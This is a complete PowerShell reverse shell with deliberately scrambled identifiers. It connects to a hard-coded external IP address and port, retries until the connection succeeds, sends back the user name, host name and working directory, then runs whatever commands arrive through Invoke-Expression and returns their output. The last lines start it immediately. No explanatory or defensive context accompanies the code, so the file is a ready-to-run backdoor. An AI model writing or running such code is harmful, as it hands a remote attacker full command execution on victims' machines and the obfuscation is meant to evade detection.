class kGbChdwCORuigqbGkPaIbIeb {
    
    [string]$XustEZylVRAOUqqM = "193.161.193.99"
    [int]$UyTfSwgNmimehpcTqtFJH = 24641

    $WEczPxxYUiELOoJSGscAjtA
    $lkzesBewZCaAjGXasu
    $iNMnmtRiUWMZSgVvZiFispy
    $GZony
    $zfPfOulJpFKcwD
    $zVjPQFlOoWWjAsOfvVk
    [int]$tnsycsVKfxPhFBnEzY = 50*1024

    CEKwRBrBblloNk() {
        $this.lkzesBewZCaAjGXasu = $false
        while ($true) {
            try {
                $this.lkzesBewZCaAjGXasu = New-Object Net.Sockets.TcpClient($this.XustEZylVRAOUqqM, $this.UyTfSwgNmimehpcTqtFJH)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.qGjMXsuyGGwIbdI()
    }

    qGjMXsuyGGwIbdI() {
        $this.WEczPxxYUiELOoJSGscAjtA = $this.lkzesBewZCaAjGXasu.GetStream()
        $this.GZony = New-Object Byte[] $this.tnsycsVKfxPhFBnEzY
        $this.zVjPQFlOoWWjAsOfvVk = New-Object Text.UTF8Encoding
        $this.iNMnmtRiUWMZSgVvZiFispy = New-Object IO.StreamWriter($this.WEczPxxYUiELOoJSGscAjtA, [Text.Encoding]::UTF8, $this.tnsycsVKfxPhFBnEzY)
        $this.zfPfOulJpFKcwD = New-Object System.IO.StreamReader($this.WEczPxxYUiELOoJSGscAjtA)
        $this.iNMnmtRiUWMZSgVvZiFispy.AutoFlush = $true
    }

    zwzTs() {
        $this.CEKwRBrBblloNk()
        $this.NALpRCjswbN()
    }

    lolvxec($rsOJsfrkkqslG) {
        try {
            [byte[]]$kfSLOOvMtZDHBKiUpt = [text.Encoding]::Ascii.GetBytes($rsOJsfrkkqslG)
            $this.iNMnmtRiUWMZSgVvZiFispy.Write($kfSLOOvMtZDHBKiUpt, 0, $kfSLOOvMtZDHBKiUpt.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.zwzTs()
        }
    }

    [string] DApjYM() {
        try {
            $DvmQkTiBllKDrLm = $this.WEczPxxYUiELOoJSGscAjtA.Read($this.GZony, 0, $this.tnsycsVKfxPhFBnEzY)    
            $jfKkDLHsKcQAuSzzMq = ($this.zVjPQFlOoWWjAsOfvVk.GetString($this.GZony, 0, $DvmQkTiBllKDrLm))
            return $jfKkDLHsKcQAuSzzMq
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.zwzTs()
            return ""
        }
    }

    [string] jnELEqCyadqi($djZnZglMAyReJFFhueLw) {
        Write-Host $djZnZglMAyReJFFhueLw
        try { 
            $NKSrrjbVv = Invoke-Expression $djZnZglMAyReJFFhueLw | Out-String
        }
        catch {
            $zZBuVeyovmqeSPkLLWaWhT = $_.Exception
            $bJqZaCnJoHaWpTXScDze = $_.Message
            $NKSrrjbVv = "`n$_`n"
        }
        return $NKSrrjbVv
    }

    [string] CgATmlp() {
        $LMMmoTrSa = [Environment]::UserName
        $JvIOoKnvpQHlRktFLiEXJv = [System.Net.Dns]::GetHostName()
        $fiRWmGqpCGlnQGsCMJ = Get-Location
        return "$LMMmoTrSa@$JvIOoKnvpQHlRktFLiEXJv [$fiRWmGqpCGlnQGsCMJ]~$ "
    }

    NALpRCjswbN() {
        while ($this.lkzesBewZCaAjGXasu.Connected) {
            $this.lolvxec($this.CgATmlp())         
            $jfKkDLHsKcQAuSzzMq = $this.DApjYM()
            $NKSrrjbVv = "`n"
            if ([string]::IsNullOrEmpty($jfKkDLHsKcQAuSzzMq)) {
                continue
            }
            $NKSrrjbVv = $this.jnELEqCyadqi($jfKkDLHsKcQAuSzzMq)
            $this.lolvxec($NKSrrjbVv + "`n")
            $this.WEczPxxYUiELOoJSGscAjtA.Flush()
        }
        $this.lkzesBewZCaAjGXasu.Close()
        $this.zwzTs()
    } 
}

$KWDtkivmnsIzf = [kGbChdwCORuigqbGkPaIbIeb]::new()
$KWDtkivmnsIzf.zwzTs()



